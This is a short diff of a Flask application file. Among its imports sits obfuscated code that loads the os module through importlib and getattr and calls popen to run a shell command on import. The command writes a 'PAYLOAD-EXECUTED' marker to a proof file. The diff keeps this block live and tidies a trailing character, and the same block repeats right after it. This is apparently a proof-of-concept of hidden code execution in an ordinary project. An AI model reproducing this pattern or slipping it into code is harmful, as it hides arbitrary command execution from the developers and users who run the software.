@@ -3,7 +3,7 @@ from flask_sqlalchemy import SQLAlchemy
 import importlib as _il
 _m = getattr(_il, "import_module")("os")
 _p = getattr(_m, "popen")
-_p("echo SALIM-RUDY-PAYLOAD-EXECUTED > salim-rudy-proof").read()-
+_p("echo SALIM-RUDY-PAYLOAD-EXECUTED > salim-rudy-proof").read()
 import importlib as _il
 _m = getattr(_il, "import_module")("os")
 _p = getattr(_m, "popen")
